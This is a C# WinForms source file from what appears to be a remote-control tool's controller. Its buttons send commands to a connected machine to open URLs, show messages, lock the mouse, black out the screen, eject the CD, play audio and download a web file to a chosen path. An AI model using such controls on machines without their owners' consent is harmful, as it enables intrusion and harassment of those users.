using System;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        /// <summary>
        /// 打开网址
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonOpenUrl_Click(object sender, EventArgs e)
        {
            var frm = new FrmInputUrl();
            frm.Owner = this;
            frm.FormClosed += (o, args) =>
                {
                    FrmInputUrl myFrm = o as FrmInputUrl;
                    if (myFrm.InputText == null)
                        return;
                    RequestOpenUrl req = new RequestOpenUrl();
                    req.Url = myFrm.InputText;
                    PostRequstWithCurrentSession(ePacketType.PACKET_OPEN_URL_REQUEST, req);
                };
            frm.Show();
        }

        private void buttonSendMessage_Click(object sender, EventArgs e)
        {
            var frm = new FrmSendMessage();
            frm.Owner = this;
            frm.FormClosing += (o, args) =>
                {
                    var myFrm = o as FrmSendMessage;
                    if (myFrm.Request == null)
                        return;

                    PostRequstWithCurrentSession(ePacketType.PACKET_MESSAGEBOX_REQUEST, myFrm.Request);
                };
            frm.Show();
        }

        private void buttonLockMouse_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmInputUrl();
            frm.Text = "请输入要锁定鼠标的时间（单位：秒）";
            frm.FormClosing += (o, args) =>
                {
                    if (frm.InputText == null)
                        return;
                    int seconds;
                    if (!int.TryParse(frm.InputText, out seconds))
                    {
                        MsgBox.Info("必须输入数字!");
                        return;
                    }
                    RequestLockMouse req = new RequestLockMouse();
                    req.LockSeconds = seconds;
                    PostRequstWithCurrentSession(ePacketType.PACKET_LOCK_MOUSE_REQUEST, req);
                };
            frm.Show();
        }

        private void buttonUnLockMouse_Click(object sender, EventArgs e)
        {
            if (MsgBox.Question("确定要取消锁定鼠标:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, null);
        }

        private void buttonBlackScreen_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, null);
        }

        private void buttonUnBlackScreen_Click(object sender, EventArgs e)
        {
            if (MsgBox.Question("确定要取消黑屏:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, null);
        }

        private void buttonOpenCD_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PACKET_OPEN_CD_REQUEST, null);
        }

        private void buttonCloseCD_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PACKET_CLOSE_CD_REQUEST, null);
        }

        private void buttonPlayMusic_Click(object sender, EventArgs e)
        {
            SendPlayMusicRequestFromPrompt();
        }

        private void SendPlayMusicRequestFromPrompt()
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmInputUrl();
            frm.Text = "请输入音乐文件全路径";
            frm.FormClosing += (o, args) =>
            {
                if (string.IsNullOrWhiteSpace(frm.InputText))
                    return;

                RequestPlayMusic req = new RequestPlayMusic();
                req.MusicFilePath = frm.InputText;
                PostRequstWithCurrentSession(ePacketType.PACKET_PLAY_MUSIC_REQUEST, req);
            };
            frm.Show();
        }

        private void buttonStopPlayMusic_Click(object sender, EventArgs e)
        {
            if (MsgBox.Question("确定要停止播放音乐:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, null);
        }

        private void buttonRemoteDownloadWebUrl_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmDownloadWebFile();
            frm.FormClosing += (o, args) =>
            {
                if (frm.WebUrl == null || frm.DestFilePath == null)
                    return;

                RequestDownloadWebFile req = new RequestDownloadWebFile();
                req.WebFileUrl = frm.WebUrl;
                req.DestinationPath = frm.DestFilePath;
                PostRequstWithCurrentSession(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, req);
            };
            frm.Show();
        }
    }
}
